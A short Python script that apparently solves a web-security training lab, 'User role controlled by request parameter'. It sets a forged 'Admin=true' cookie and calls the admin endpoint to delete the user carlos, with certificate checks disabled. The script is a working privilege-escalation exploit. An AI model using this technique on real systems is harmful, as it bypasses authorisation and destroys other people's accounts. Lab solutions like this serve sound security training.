import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "User role controlled by request parameter"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Add the cookie 'Admin' and set it to 'true'\n2. Delete carlos from the admin panel\n""")

    print(Fore.WHITE +
          "[+] Deleting carlos from the admin panel after setting the 'Admin' cookie to true")

    cookies = {"Admin": "true"}

    try:
        r = requests.get(
            f"{url}/admin/delete?username=carlos", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
